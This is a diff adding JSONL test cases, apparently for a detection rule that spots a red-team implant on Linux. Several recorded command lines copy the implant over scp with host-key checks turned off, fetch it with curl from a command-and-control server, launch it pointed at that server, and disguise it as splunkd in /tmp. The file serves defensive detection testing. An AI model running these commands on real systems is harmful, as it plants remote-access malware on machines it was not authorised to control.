@@ -1,0 +1,7 @@
+{"name": "implant copied by scp as sandcat_tmp.go", "expected": true, "event": {"Image": "/usr/bin/scp", "CommandLine": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux 10.2.0.9:~/sandcat_tmp.go"}}
+{"name": "reachability check before the implant starts", "expected": true, "event": {"Image": "/usr/bin/curl", "CommandLine": "curl -s -m 5 -o /dev/null -w C2:%{http_code} http://10.2.0.5:8888/"}}
+{"name": "implant pulled with the file header", "expected": true, "event": {"Image": "/usr/bin/curl", "CommandLine": "curl -svkOJ -X POST -H file:sandcat.go -H platform:linux http://10.2.0.5:8888/file/download"}}
+{"name": "implant started with server and group arguments", "expected": true, "event": {"Image": "/home/user/agent", "CommandLine": "./agent -server http://10.2.0.5:8888 -group red"}}
+{"name": "implant saved as splunkd", "expected": true, "event": {"Image": "/tmp/splunkd", "CommandLine": "/tmp/splunkd -server http://10.2.0.5:8888"}}
+{"name": "near miss: the real Splunk daemon", "expected": false, "event": {"Image": "/opt/splunkforwarder/bin/splunkd", "CommandLine": "splunkd -p 8089 start"}}
+{"name": "near miss: a curl download with another header", "expected": false, "event": {"Image": "/usr/bin/curl", "CommandLine": "curl -s -H platform:linux https://downloads.example.test/agent.tar.gz"}}
